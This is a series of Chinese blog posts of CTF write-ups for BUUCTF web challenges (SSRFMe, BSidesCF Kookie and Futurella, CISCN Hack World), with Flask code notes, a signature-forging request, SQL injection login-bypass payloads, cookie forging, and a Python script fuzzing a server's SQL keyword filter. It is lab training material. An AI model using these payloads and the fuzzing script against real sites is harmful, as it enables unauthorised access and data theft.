action).hexdigest()<br><br><br><span class="hljs-comment"># 对content内容进行md5加密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><span class="hljs-comment"># 对输入的参数进行过滤</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    <span class="hljs-comment"># 去除param首位空格，并将该字符串全部字符小写化</span><br>    check = param.strip().lower()<br>    <span class="hljs-comment"># 检测字符串是否以gopher和file开头</span><br>    <span class="hljs-comment"># 即过滤了gopher和file两个协议</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># main函数描述了该代码通过访问的路由来控制显示的网页内容</span><br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><h3 id="知识点介绍"><a href="#知识点介绍" class="headerlink" title="知识点介绍:"></a><strong>知识点介绍:</strong></h3><p>参考：<a href="https://geek-docs.com/flask/flask-questions/268_flask_flask_requestargsget_get_all_params_python.html">Flask Flask request.args.get 获取所有参数（Python）|极客教程 (geek-docs.com)</a></p><p><strong>urllib.unquote(string):将url编码的字符串进行解码</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">import urllib.parse<br><br>str = &#x27;%E6%B3%95%E5%9B%BD%E7%BA%A2%E9%85%92&#x27;<br><br>print(urllib.parse.unquote(str))<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">法国红酒<br></code></pre></td></tr></table></figure><h5 id="使用request-args-get获取指定参数的值"><a href="#使用request-args-get获取指定参数的值" class="headerlink" title="使用request.args.get获取指定参数的值"></a>使用request.args.get获取指定参数的值</h5><p>例子:假设我们有一个URL为<code>/user?name=John&amp;age=25</code>，我们想要获取到对应参数的值</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">from flask import Flask, request<br><br>app = Flask(__name__)<br><br>@app.route(&#x27;/user&#x27;, methods=[&#x27;GET&#x27;])<br>def get_user():<br>    name = request.args.get(&#x27;name&#x27;)<br>    age = request.args.get(&#x27;age&#x27;)<br><br>    return f&quot;Name: &#123;name&#125;, Age: &#123;age&#125;&quot;<br><br>if __name__ == &#x27;__main__&#x27;:<br>    app.run()<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上面的代码中，我们定义了一个路由/user，并指定该路由只支持GET方法。<br>在get_user函数中，我们使用request.args.get方法获取了URL参数中名为name和age的值，并将其拼接成字符串返回。当我们访问/user?name=John&amp;age=25时，页面会显示Name: John, Age: 25<br></code></pre></td></tr></table></figure><h5 id="使用request-args-get获取所有参数的值"><a href="#使用request-args-get获取所有参数的值" class="headerlink" title="使用request.args.get获取所有参数的值"></a>使用request.args.get获取所有参数的值</h5><p>例子:有时候我们并不知道URL参数的具体名称，或者URL参数的数量是可变的。这时，我们可以使用<code>request.args.get</code>方法的另一种形式，即不传递参数名，直接获取所有参数的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;All Params: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上述代码中，我们使用request.args.get方法获取所有URL参数的值，并将其拼接成字符串返回。例如，当我们访问/user?name=John&amp;age=25&amp;city=New+York时，页面会显示All Params: ImmutableMultiDict([(&#x27;name&#x27;, &#x27;John&#x27;), (&#x27;age&#x27;, &#x27;25&#x27;), (&#x27;city&#x27;, &#x27;New York&#x27;)])。<br></code></pre></td></tr></table></figure><h5 id="需要注意的是，request-args-get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args-getlist-‘name’-可以获取名为name的参数的所有值"><a href="#需要注意的是，request-args-get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args-getlist-‘name’-可以获取名为name的参数的所有值" class="headerlink" title="需要注意的是，request.args.get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args.getlist(‘name’)可以获取名为name的参数的所有值"></a>需要注意的是，request.args.get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args.getlist(‘name’)可以获取名为name的参数的所有值</h5><p>例子:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br>    name = args.getlist(<span class="hljs-string">&#x27;name&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Name: <span class="hljs-subst">&#123;name&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上述代码中，我们使用args.getlist方法获取名为name的参数的所有值，并将其拼接成字符串返回。当我们访问/user?name=John&amp;name=Tom&amp;name=Jack时，页面会显示Name: [&#x27;John&#x27;, &#x27;Tom&#x27;, &#x27;Jack&#x27;]<br></code></pre></td></tr></table></figure><h5 id="hashlib-md5"><a href="#hashlib-md5" class="headerlink" title="hashlib.md5():"></a>hashlib.md5():</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib         <span class="hljs-comment">#导入hashlib模块</span><br><br>md = hashlib.md5()     <span class="hljs-comment">#获取一个md5加密算法对象</span><br>md.update(<span class="hljs-string">&#x27;how to use md5 in hashlib?&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))                   <span class="hljs-comment">#制定需要加密的字符串</span><br><span class="hljs-built_in">print</span>(md.hexdigest())  <span class="hljs-comment">#获取加密后的16进制字符串</span><br></code></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">d26a53750bc40b38b65a520292f69306<br></code></pre></td></tr></table></figure><h5 id="str-strip-chars-移除在字符串str中的首尾字符chars-默认移除空格"><a href="#str-strip-chars-移除在字符串str中的首尾字符chars-默认移除空格" class="headerlink" title="str.strip([chars]):移除在字符串str中的首尾字符chars,默认移除空格"></a>str.strip([chars]):移除在字符串str中的首尾字符chars,默认移除空格</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">str = &quot;0000hello0000&quot;.strip(&#x27;0&#x27;)<br>print(str)<br># hello<br>str = &quot;     hello    &quot;.strip()<br>print(str)<br># hello<br></code></pre></td></tr></table></figure><h5 id="str-lower-将字符串str所有字符转小写"><a href="#str-lower-将字符串str所有字符转小写" class="headerlink" title="str.lower():将字符串str所有字符转小写"></a>str.lower():将字符串str所有字符转小写</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;AAAAAsssDDD&quot;</span>.lower()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-comment"># aaaaasssddd</span><br></code></pre></td></tr></table></figure><h5 id="Python-startswith-方法用于检查字符串是否是以指定子字符串开头，如果是则返回-True，否则返回-False。如果参数-beg-和-end-指定值，则在指定范围内检查："><a href="#Python-startswith-方法用于检查字符串是否是以指定子字符串开头，如果是则返回-True，否则返回-False。如果参数-beg-和-end-指定值，则在指定范围内检查：" class="headerlink" title="Python startswith() 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。如果参数 beg 和 end 指定值，则在指定范围内检查："></a>Python startswith() 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。如果参数 beg 和 end 指定值，则在指定范围内检查：</h5><p>参考:<a href="https://www.runoob.com/python/att-string-startswith.html">Python startswith()方法 | 菜鸟教程 (runoob.com)</a></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131547193.png" alt="image-20230829131547193"></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131601809.png" alt="image-20230829131601809"></p><h5 id="urllib-urlopen-path"><a href="#urllib-urlopen-path" class="headerlink" title="urllib.urlopen(path):"></a>urllib.urlopen(path):</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><br>myURL = urlopen(<span class="hljs-string">&quot;https://www.runoob.com/&quot;</span>)<br><span class="hljs-built_in">print</span>(myURL.read())<br></code></pre></td></tr></table></figure><p>解释:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">以上代码使用 urlopen 打开一个 URL，然后使用 read() 函数获取网页的 HTML 实体代码。<br><br>read() 是读取整个网页内容，我们可以指定读取的长度<br>如读取长度为300：read(300)<br></code></pre></td></tr></table></figure><h5 id="REMOTE-ADDR"><a href="#REMOTE-ADDR" class="headerlink" title="REMOTE_ADDR:"></a>REMOTE_ADDR:</h5><p>参考:<a href="https://www.cnblogs.com/luxiaojun/p/10451860.html">HTTP 请求头中的 Remote_Addr，X-Forwarded-For，X-Real-IP - 23云恋49枫 - 博客园 (cnblogs.com)</a></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">表示发出请求的远程主机的 IP 地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP<br></code></pre></td></tr></table></figure><h5 id="x-forwarded-for："><a href="#x-forwarded-for：" class="headerlink" title="x_forwarded_for："></a>x_forwarded_for：</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP<br></code></pre></td></tr></table></figure><h5 id="os-path-exists"><a href="#os-path-exists" class="headerlink" title="os.path.exists():"></a>os.path.exists():</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">os即operating system（操作系统），Python 的 os 模块封装了常见的文件和目录操作。os.path模块主要用于文件的属性获取,exists是“存在”的意思，所以顾名思义，os.path.exists()就是判断括号里的文件是否存在的意思，括号内的可以是文件路径<br>原文链接：https://blog.csdn.net/u012424313/article/details/82216092<br></code></pre></td></tr></table></figure><p>4.分析:<br>(1).有代码分析得访问url&#x2F;geneSign只会返回md5(secert_key + param + action)的结果，访问url&#x2F;只会返回code.txt文件的内容，所以我们只能去访问url&#x2F;De1ta:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://25f82c99-8160-4244-bc6c-fee7c6ef602e.node4.buuoj.cn:81/De1ta<br></code></pre></td></tr></table></figure><p>对路由器@app.route(‘&#x2F;De1ta’, methods&#x3D;[‘GET’, ‘POST’])下的函数进行分析后得:</p><p>我们需要令param&#x3D;flag.txt,同时action中必须有scan,这样就可以调用</p><p>scan(param)，去访问当前网页下的文件flag.txt(如果直接访问是访问不到的，可能是flask框架的作用)</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829140947972.png" alt="image-20230829140947972"></p><p>(2).但是如果只有scan是无法对文件内容进行显示的，只有action中包含有read时，才能进行显示文件内容:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141123757.png" alt="image-20230829141123757"></p><p>read可以将写入flag.txt的内容的文件result.txt再次进行读取，并存如最终需要显示的result字典中:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141312146.png" alt="image-20230829141312146"></p><p>所以action&#x3D;scanread</p><p>(3).要触发上述内容需要绕过checkSign()的检测:<br><strong>md5(secert_key + param + action)&#x3D;sign</strong></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141406740.png" alt="image-20230829141406740"></p><p>5.最终payload的构造:</p><p>(1).<strong>secert_key:</strong><br><img src="/images/2023-8-29-SSRFMe/image-20230829142324834.png" alt="image-20230829142324834"></p><p><strong>由于flask框架中，网页显示（执行）的都是路由器的内容，所以对于网页来说，在路由器之前所定义的secert_key在网页显示后都是唯一的，即在网页初始化的时候对secert_key赋值，之后该全局变量都是不变的</strong></p><p>(2).参数的基本情况:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txt<br>action=scanread<br>secert_key=xxx<br>sign=md5(xxxflag.txtscanread)<br></code></pre></td></tr></table></figure><p>现在就是要获取md5(xxxflag.txtscanread)的值</p><p>(3)url&#x2F;geneSign的利用:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829142858868.png" alt="image-20230829142858868"></p><p>该路由器会返回:md5(secert_key+param+scan)的值</p><p>所以如果我们令param&#x3D;flag.txtread</p><p>则该路由器返回的就是md5(xxxflag.txtreadscan)</p><p>就可以活得sign的值：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txtread<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p>所以此时sign&#x3D;5927506259f0daa2cdfb35867203b343&#x3D;xxxflag.txtreadscan</p><p>(3).最终的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">url/De1ta<br>?param=flag.txt<br><br>Cookie:action=readscan;sign=5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-SSRFMe/image-20230829143838356.png" alt="image-20230829143838356"></p><p>flag&#x3D;flag{ceb51b96-bdcf-415a-bb56-da305f851028}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解</title>
    <link href="/2023/08/29/2023-08-29-Futurella&amp;Kookie/"/>
    <url>/2023/08/29/2023-08-29-Futurella&amp;Kookie/</url>
    
    <content type="html"><![CDATA[<h2 id="BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-题解"><a href="#BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-题解" class="headerlink" title="[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解"></a>[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解</h2><h3 id="BSidesCF-2019-Futurella："><a href="#BSidesCF-2019-Futurella：" class="headerlink" title="[BSidesCF 2019]Futurella："></a>[BSidesCF 2019]Futurella：</h3><p>1.打开网页:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102315243.png" alt="image-20230829102315243"></p><p>2.查看网页源代码，ctrl+f寻找flag：<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102410491.png" alt="image-20230829102410491"></p><p>flag&#x3D;flag{bbc0ff54-a162-4d27-a1db-2e02a3bb9208}</p><h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie:"></a>[BSidesCF 2019]Kookie:</h3><p>1.打开网页:<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829100927708.png" alt="image-20230829100927708"></p><p>发现需要进行登录，然后登录时要为admin</p><p>2.查看网页源代码，没有发现有用信息，那么我们使用万能密码试试:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101139704.png" alt="image-20230829101139704"></p><p>发现不行</p><p>查看是否存在sql注入:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101226407.png" alt="image-20230829101226407"></p><p>发现没有sql报错</p><p><strong>3.使用三大盲注，但是盲注是回显1或0的界面，由于password不是0或1所以无论怎么样都回显的是错误界面</strong></p><p>4.有题目提示得，这题和cookie有关，我们用BP对其进行抓包:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101755577.png" alt="image-20230829101755577"></p><p>我们猜测可能要修改cookie的值，但是在headers中没有发现cookie字段</p><p>又根据题目提示：we found the account cookie,猜测他们可能是从cookie中判断当前用户的登录账户是谁</p><p>构造payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:username=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102106154.png" alt="image-20230829102106154"></p><p>发现了flag</p><p>flag&#x3D;flag{98c976cd-ae86-46c5-b83e-8d86080798b9}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 华北赛区 Day2 Web1]Hack World 题解</title>
    <link href="/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/"/>
    <url>/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>1.打开网页:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828141042210.png" alt="image-20230828141042210"></p><p>发现有一个注入点，尝试对其进行注入，由题目提示得，flag在数据库中，所以该注入点应该为sql注入:</p><p>使用BP测试该网站属于什么请求:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141849022.png" alt="image-20230828141849022"></p><p>使用脚本判断该网站过滤了哪些内容:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # 使用time使请求能够拥有足够的时间去响应</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # 获取过滤网站响应信息</span><br><span class="hljs-comment">#     reponse_txt = &quot;臭弟弟&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    payload = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: da<br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;SQL&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs txt">该网站过滤了length Length<br>该网站过滤了+<br>该网站过滤了handler<br>该网站过滤了selectSeleCT <br>该网站过滤了delete<br>该网站过滤了oroR<br>该网站过滤了-~<br>该网站过滤了limitLimIt<br>该网站过滤了insertinsERTINSERT<br>该网站过滤了#<br>该网站过滤了--+<br>该网站过滤了INFORMATION<br>该网站过滤了--<br>该网站过滤了;<br>该网站过滤了+<br>该网站过滤了xor<br>该网站过滤了ANDANd<br>该网站过滤了&quot;<br>该网站过滤了length <br>该网站过滤了+<br>该网站过滤了unionUNIonUNION<br>该网站过滤了&quot;<br>该网站过滤了&amp;<br>该网站过滤了&amp;&amp;<br>该网站过滤了||<br>该网站过滤了oorr<br>该网站过滤了//*<br>该网站过滤了*/*<br>该网站过滤了/**/<br>该网站过滤了anandd<br>该网站过滤了GROUP<br>该网站过滤了INTO<br>该网站过滤了OR<br>该网站过滤了ORDER<br>该网站过滤了ORD<br>该网站过滤了UNION<br>该网站过滤了UPDATE<br>该网站过滤了AND<br>该网站过滤了delete<br>该网站过滤了GROUP_CONCAT<br>该网站过滤了group_concat<br>该网站过滤了DELETE<br>该网站过滤了floor<br>该网站过滤了rand()<br>该网站过滤了information_schema.tables<br>该网站过滤了LIMIT<br>该网站过滤了ORD<br>该网站过滤了order <br>该网站过滤了ORDER<br>该网站过滤了OUTFILE<br>该网站过滤了updatexml<br>该网站过滤了format<br>该网站过滤了ord<br>该网站过滤了UPDATE<br>该网站过滤了/*<br>该网站过滤了`<br>该网站过滤了  <br>该网站过滤了for<br>该网站过滤了BEFORE<br>该网站过滤了sys 